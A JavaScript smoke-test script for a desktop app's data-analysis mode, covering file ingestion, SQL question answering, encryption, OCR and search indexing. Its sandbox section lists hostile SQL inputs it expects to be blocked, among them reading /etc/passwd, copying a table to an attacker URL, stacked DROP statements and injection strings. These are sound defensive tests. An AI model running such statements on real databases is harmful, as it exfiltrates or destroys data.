// Deep smoke test for Data Mode.
//
// Runs against the BUILT dist inside the real Electron runtime, not vitest, so
// it exercises the same module resolution, the same Node build (22.21.1), and
// the same staged native binaries a user would get.
//
//   cd apps/x && ELECTRON_RUN_AS_NODE=1 \
//     node_modules/.pnpm/electron@39.2.7/node_modules/electron/dist/Electron.app/Contents/MacOS/Electron \
//     scripts/smoke-data-mode.mjs

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const APP = path.resolve(HERE, '..');
const CORE = path.join(APP, 'packages', 'core', 'dist');
// pnpm's strict layout keeps third-party deps under packages/core, so resolve
// them from there rather than from this script's own directory.
const coreRequire = createRequire(path.join(APP, 'packages', 'core', 'x.js'));

const WORKDIR = fs.mkdtempSync(path.join(os.tmpdir(), 'dhow-smoke-'));
const FIXTURES = fs.mkdtempSync(path.join(os.tmpdir(), 'dhow-smoke-fx-'));
process.env.DHOW_WORKDIR = WORKDIR;
process.env.DHOW_DATA_KEY = 'smoke-key';
process.env.DHOW_DUCKDB_EXTENSIONS = path.join(APP, 'apps', 'main', '.package', 'duckdb-extensions');
process.env.DHOW_OCR_BIN = path.join(APP, 'apps', 'main', '.package', 'dist', 'ocr');

let pass = 0;
let fail = 0;
const failures = [];

function check(label, condition, detail = '') {
    if (condition) {
        pass++;
        console.log(`  \u2713 ${label}${detail ? `  ${detail}` : ''}`);
    } else {
        fail++;
        failures.push(label);
        console.log(`  \u2717 ${label}${detail ? `  ${detail}` : ''}`);
    }
}

function section(title) {
    console.log(`\n=== ${title} ===`);
}

const t0 = Date.now();

// ---------------------------------------------------------------- 1. runtime
section('1. Runtime and staged artifacts');
check('running under Electron', !!process.versions.electron, `electron ${process.versions.electron}, node ${process.versions.node}`);
check(
    'node:sqlite present (brain index needs it)',
    !!(await import('node:sqlite').then((m) => m.DatabaseSync).catch(() => null)),
);
check('staged excel extension exists', fs.existsSync(process.env.DHOW_DUCKDB_EXTENSIONS));
check('staged OCR helper exists', fs.existsSync(process.env.DHOW_OCR_BIN));
check('built core dist exists', fs.existsSync(path.join(CORE, 'data', 'engine.js')));

const { getEngine, closeAllEngines, normalizeValue } = await import(path.join(CORE, 'data', 'engine.js'));
const { ingestCsv, ingestXlsx } = await import(path.join(CORE, 'data', 'ingest.js'));
const { writeTableNote } = await import(path.join(CORE, 'data', 'graph-bridge.js'));
const { getKnowledgeIndex } = await import(path.join(CORE, 'knowledge', 'knowledge_index.js'));
const { ask, describeProvenance } = await import(path.join(CORE, 'data', 'ask.js'));
const { ocrFile, shouldEscalateToLLM } = await import(path.join(CORE, 'data', 'ocr.js'));
const { gridFromBoxes, extractTableBlock } = await import(path.join(CORE, 'data', 'table-from-boxes.js'));
const { auditLineItems, auditStatedTotals, sumColumn, describeAudit } = await import(path.join(CORE, 'data', 'audit.js'));
const { FtsIndex } = await import(path.join(CORE, 'search', 'fts-index.js'));
const { toMarkdown } = await import(path.join(CORE, 'data', 'documents.js'));

// ------------------------------------------------------------ 2. CEO journey
section('2. The CEO journey: drop a finance CSV, ask a question');
const csvPath = path.join(FIXTURES, 'Q1 P&L (final).csv');
{
    const rows = [
        'ACME Trading Ltd,,,',
        'Profit and Loss Q1 2026,,,',
        ',,,',
        'region,month,product,revenue',
    ];
    const regions = ['EMEA', 'APAC', 'AMER'];
    const products = ['Maize flour', 'Cooking oil', 'Sugar'];
    for (let i = 0; i < 6000; i++) {
        const month = `2026-0${(i % 3) + 1}`;
        rows.push(`${regions[i % 3]},${month},${products[i % 3]},${(100 + (i % 700)).toFixed(2)}`);
    }
    rows.push(',,,');
    rows.push('Total,,,2760000.00');
    rows.push('* unaudited figures pending review,,,');
    fs.writeFileSync(csvPath, rows.join('\n'));
}

const profile = await ingestCsv(csvPath, { workspaceId: 'smoke' });
check('imported a 6000-row messy CSV', profile.rowCount === 6000, `rows=${profile.rowCount}`);
check('found the header under a title block', profile.notes.join(' ').includes('Header detected on row 4'));
check('excluded the totals row (no double counting)', profile.notes.join(' ').match(/totals row/i) !== null);
check('sanitized a hostile filename into an identifier', /^[a-z_][a-z0-9_]*$/.test(profile.table), profile.table);

const notePath = writeTableNote(profile);
check('table written to brain graph', fs.existsSync(notePath), notePath);
const kg = getKnowledgeIndex();
check('brain index knows the table', kg.other.some((o) => o.name === profile.table), `tables=${kg.other.map((o) => o.name).join(', ')}`);

check('typed revenue numerically', profile.columns.find((c) => c.name === 'revenue')?.type === 'DOUBLE');
check('captured sample values for schema linking', (profile.columns[0]?.sample.length ?? 0) > 0);

const askResult = await ask('total revenue by region', {
    workspaceId: 'smoke',
    generate: async () => 'SELECT region, sum(revenue) AS total FROM ' + profile.table + ' GROUP BY 1 ORDER BY total DESC',
});
check('answered the question', askResult.ok);
check('returned aggregate rows, not raw data', askResult.rowCount === 3, `rows=${askResult.rowCount}`);
check('revenue is a JSON number (charts require it)', typeof askResult.rows[0]?.total === 'number', `typeof=${typeof askResult.rows[0]?.total}`);
check('provenance names the table', askResult.provenance.tables.includes(profile.table));
check('provenance reports rows scanned', askResult.provenance.rowsScanned === 6000);
check('provenance renders for the disclosure', describeProvenance(askResult).includes('SQL:'));

// ------------------------------------------------- 3. repair loop under load
section('3. Review-and-repair loop');
let attemptCount = 0;
const repaired = await ask('total revenue by region', {
    workspaceId: 'smoke',
    generate: async () => {
        attemptCount++;
        return attemptCount === 1
            ? `SELECT regoin, sum(revenue) AS total FROM ${profile.table} GROUP BY 1`
            : `SELECT region, sum(revenue) AS total FROM ${profile.table} GROUP BY 1`;
    },
});
check('recovered from a wrong column name', repaired.ok && repaired.attempts === 2, `attempts=${repaired.attempts}`);

const refused = await ask('drop everything', {
    workspaceId: 'smoke',
    maxAttempts: 2,
    generate: async () => `DROP TABLE ${profile.table}`,
});
check('never executes a destructive statement', !refused.ok);

// ----------------------------------------------------------- 4. the sandbox
section('4. Sandbox (untrusted SQL path)');
const engine = await getEngine('smoke');
const attacks = [
    ['DROP', `DROP TABLE ${profile.table}`],
    ['UPDATE', `UPDATE ${profile.table} SET revenue = 0`],
    ['CREATE', 'CREATE TABLE evil AS SELECT 1'],
    ['stacked statements', `SELECT 1; DROP TABLE ${profile.table}`],
    ['PRAGMA', 'PRAGMA version'],
    ['read /etc/passwd', "SELECT * FROM read_csv_auto('/etc/passwd')"],
    ['exfiltrate over https', `COPY ${profile.table} TO 'https://evil.example/x.csv'`],
    ['INSTALL', 'INSTALL httpfs'],
    ['LOAD', 'LOAD spatial'],
    ['unlock config', 'SET enable_external_access=true'],
    ['ATTACH another db', "ATTACH '/tmp/evil.db' AS e"],
    ['quote-escape injection', `SELECT 1') ; DROP TABLE ${profile.table}; --`],
];
for (const [label, sql] of attacks) {
    const r = await engine.query(sql);
    check(`blocked: ${label}`, r.ok === false);
}
const survived = await engine.query(`SELECT count(*) AS n FROM ${profile.table}`);
check('table survived every attack', survived.ok && Number(survived.rows[0].n) === 6000);

// --------------------------------------------------------- 5. encryption
section('5. Encryption at rest');
await engine.close();
const dbFile = path.join(WORKDIR, 'data', 'smoke', 'analytics.duckdb');
check('store file exists', fs.existsSync(dbFile));
{
    const bytes = fs.readFileSync(dbFile);
    check('no plaintext table name on disk', !bytes.includes(Buffer.from('Maize flour')));
    check('no plaintext region on disk', !bytes.includes(Buffer.from('EMEA')));
}

// -------------------------------------------------------------- 6. XLSX
section('6. XLSX with a cover page');
{
    const XLSX = coreRequire('xlsx');
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Quarterly Pack'], ['finance']]), 'Cover');
    XLSX.utils.book_append_sheet(
        wb,
        XLSX.utils.aoa_to_sheet([
            ['region', 'month', 'revenue'],
            ['EMEA', '2026-01', 1200.5],
            ['APAC', '2026-01', 880.25],
            ['Total', '', 2080.75],
        ]),
        'P&L',
    );
    const xlsxPath = path.join(FIXTURES, 'book.xlsx');
    XLSX.writeFile(wb, xlsxPath);

    const profiles = await ingestXlsx(xlsxPath, { workspaceId: 'smokexl' });
    const pnl = profiles.find((p) => p.sheet === 'P&L');
    const cover = profiles.find((p) => p.sheet === 'Cover');
    check('skipped the cover sheet', cover?.rowCount === 0);
    check('imported the data sheet', pnl?.rowCount === 2, `rows=${pnl?.rowCount}`);
    const xe = await getEngine('smokexl');
    const sum = await xe.query(`SELECT sum(revenue) AS t FROM ${pnl.table}`);
    check('totals row excluded from the sum', Math.abs(Number(sum.rows[0].t) - 2080.75) < 0.01, `sum=${sum.rows[0].t}`);
    await xe.close();
}

// ------------------------------------------------- 7. OCR -> table -> arithmetic audit
section('7. OCR -> table -> arithmetic audit');
const samplePng = '/tmp/ocrtest/sample.png';
if (fs.existsSync(samplePng)) {
    // Tesseract is the cross-platform fallback; verify it can run offline with
    // the staged traineddata (no CDN download). It does not need the Vision
    // binary, so this check runs on every platform.
    const tess = await ocrFile(samplePng, { engine: 'tesseract' });
    check(
        'tesseract OCR works offline',
        tess.engine === 'tesseract' && tess.lines.length >= 5 && tess.meanConfidence > 0.5,
        `lines=${tess.lines.length}, mean=${tess.meanConfidence.toFixed(2)}, ${tess.ms}ms`,
    );

    // Vision is macOS-only and higher quality; the full table-audit chain
    // requires the bbox precision it provides.
    if (process.platform === 'darwin' && fs.existsSync(process.env.DHOW_OCR_BIN)) {
        const result = await ocrFile(samplePng);
        check('OCR produced lines', result.lines.length > 20, `lines=${result.lines.length}, ${result.ms}ms, engine=${result.engine}`);
        check('confidence high enough to skip LLM escalation', !shouldEscalateToLLM(result), `mean=${result.meanConfidence.toFixed(2)}`);

        const grid = gridFromBoxes(result.lines);
        check('homoglyph repaired in reconstructed grid', grid[0]?.[0] === 'ACME TRADING LTD', JSON.stringify(grid[0]?.[0]));

        const { table, after } = extractTableBlock(grid);
        check('isolated the 4-column line-item table', table.length === 4, `rows=${table.length}`);
        check('totals block kept out of the table', after.some((r) => r[0] === 'TOTAL DUE'));

        const rows = table.slice(1).map((r) => ({ item: r[0], qty: r[1], unit: r[2], amount: r[3] }));
        const lineAudit = auditLineItems(rows);
        check('every line item reconciles', lineAudit.reconciles, describeAudit(lineAudit));

        const subtotal = sumColumn(rows, 'amount');
        check('derived subtotal matches the printed 5,365.75', Math.abs(subtotal - 5365.75) < 0.01, `derived=${subtotal}`);
        const statedAudit = auditStatedTotals(rows, { Subtotal: 5365.75 }, 'amount');
        check('stated subtotal reconciles', statedAudit.reconciles);
    } else {
        console.log('  - skipped: Vision table audit (macOS + compiled helper only)');
    }
} else {
    console.log('  - skipped: /tmp/ocrtest/sample.png missing');
}

// ------------------------------------------------------------- 8. brain FTS
section('8. Brain FTS5 index');
{
    const notes = path.join(WORKDIR, 'knowledge');
    fs.mkdirSync(path.join(notes, 'People'), { recursive: true });
    for (let i = 0; i < 200; i++) {
        fs.writeFileSync(path.join(notes, 'People', `n${i}.md`), `contact ${i}\nprocurement quarterly notes`);
    }
    fs.writeFileSync(path.join(notes, 'People', 'heavy.md'), 'supplier supplier supplier supplier margin');
    fs.writeFileSync(path.join(notes, 'People', 'light.md'), 'supplier margin once');

    const idx = new FtsIndex(path.join(WORKDIR, 'smoke_fts.sqlite'));
    const first = await idx.syncDir(notes);
    // 202 People notes plus the Data note written in section 2.
    check('first sync indexed everything', first.added >= 202, `added=${first.added}`);
    const second = await idx.syncDir(notes);
    check('second sync is a no-op', second.added === 0 && second.updated === 0);

    fs.writeFileSync(path.join(notes, 'People', 'fresh.md'), 'urgent payroll discrepancy');
    const third = await idx.syncDir(notes);
    check('incremental add without a full rebuild', third.added === 1);
    check('new term findable immediately', idx.search('payroll').length === 1);

    const ranked = idx.search('supplier').map((h) => path.basename(h.path));
    check('ranks by relevance', ranked.indexOf('heavy.md') < ranked.indexOf('light.md'), ranked.slice(0, 2).join(' > '));
    check('FTS5 syntax in a query does not throw', idx.search('supplier AND margin').length > 0);

    fs.rmSync(path.join(notes, 'People', 'fresh.md'));
    const fourth = await idx.syncDir(notes);
    check('deletion removes from the index', fourth.removed === 1 && idx.search('payroll').length === 0);
    idx.close();
}

// -------------------------------------------------------- 9. documents
section('9. Document conversion');
{
    const html = path.join(FIXTURES, 'p.html');
    fs.writeFileSync(html, '<h1>Q1</h1><p>Revenue <strong>up</strong></p>');
    const doc = await toMarkdown(html);
    check('HTML converts to markdown', doc.markdown.includes('# Q1'));
    const zip = path.join(FIXTURES, 'x.zip');
    fs.writeFileSync(zip, 'not really a zip');
    const bad = await toMarkdown(zip);
    check('unsupported format returns a message, not a throw', bad.notes.join(' ').includes('Unsupported'));
}

// -------------------------------------------------------- 10. parseFile cap
section('10. parseFile guard (the original context bomb)');
{
    const { parsingTools } = await import(path.join(CORE, 'runtime', 'tools', 'domains', 'parsing.js'));
    const big = path.join(FIXTURES, 'big.csv');
    const lines = ['region,month,revenue'];
    for (let i = 0; i < 5000; i++) lines.push(`EMEA,2026-01,${i}.50`);
    fs.writeFileSync(big, lines.join('\n'));

    const out = await parsingTools['parseFile'].execute({ path: big });
    check('parseFile still succeeds', out.success === true);
    check('caps rows at 50', out.data.length === 50, `rows=${out.data.length}`);
    check('reports the true total', out.totalRows === 5000);
    check('flags truncation', out.truncated === true);
    check('points at the query path', String(out.hint).includes('data-analysis'));
    check('caps raw content too', out.content.split('\n').length <= 201);

    const before = JSON.stringify(out).length;
    check('tool result stays small', before < 20000, `${before} bytes for a 5000-row file`);
}

// ----------------------------------------------------------------- summary
await closeAllEngines();
fs.rmSync(WORKDIR, { recursive: true, force: true });
fs.rmSync(FIXTURES, { recursive: true, force: true });

console.log(`\n${'='.repeat(56)}`);
console.log(`  ${pass} passed, ${fail} failed  (${((Date.now() - t0) / 1000).toFixed(1)}s)`);
if (fail) {
    console.log('  FAILURES:');
    for (const f of failures) console.log(`    - ${f}`);
}
console.log('='.repeat(56));
process.exit(fail ? 1 : 0);
